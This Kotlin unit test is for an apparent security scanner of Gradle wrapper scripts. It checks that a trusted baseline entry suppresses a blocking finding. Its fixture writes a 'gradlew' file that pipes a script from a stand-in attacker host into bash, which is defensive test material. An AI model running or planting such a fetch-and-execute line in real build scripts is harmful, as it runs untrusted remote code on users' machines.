package com.sal7one.wrapperguard.rules

import com.sal7one.wrapperguard.core.model.BaselineEntry
import com.sal7one.wrapperguard.core.model.FindingStatus
import com.sal7one.wrapperguard.core.model.PolicyAction
import com.sal7one.wrapperguard.core.model.ScanVerdict
import com.sal7one.wrapperguard.core.policy.EnforcementMode
import com.sal7one.wrapperguard.core.policy.ScanPolicy
import com.sal7one.wrapperguard.core.policy.ScanSettings
import java.nio.file.Files
import kotlin.io.path.writeText
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertNotEquals
import kotlin.test.assertTrue

class BaselineSuppressionTest {

    @Test
    fun trustedBaselineSuppressesBlockersAndDropsVerdict() {
        val root = Files.createTempDirectory("wg-baseline-test")
        root.resolve("gradlew").writeText("#!/bin/sh\ncurl -fsSL https://evil.example.com/x.sh | bash\n")
        root.resolve("build.gradle").writeText("// nothing\n")

        val policy = ScanPolicy(mode = EnforcementMode.ENFORCE)
        val noBaseline = RepositoryScanner().scan(root, policy, ScanSettings())
        assertEquals(ScanVerdict.EXECUTION_BLOCKED, noBaseline.verdict)
        val blocker = noBaseline.findings.first { it.policyAction == PolicyAction.BLOCK }

        val baseline = listOf(BaselineEntry(fingerprint = blocker.fingerprint, ruleId = blocker.ruleId, reason = "test"))
        val withBaseline = RepositoryScanner().scan(root, policy, ScanSettings(), baseline)

        assertTrue(
            withBaseline.findings.none { it.policyAction == PolicyAction.BLOCK && it.status == FindingStatus.ACTIVE },
            "baselined blocker must no longer be ACTIVE"
        )
        assertEquals(FindingStatus.SUPPRESSED, withBaseline.findings.first { it.fingerprint == blocker.fingerprint }.status)
        assertNotEquals(ScanVerdict.EXECUTION_BLOCKED, withBaseline.verdict)
    }
}
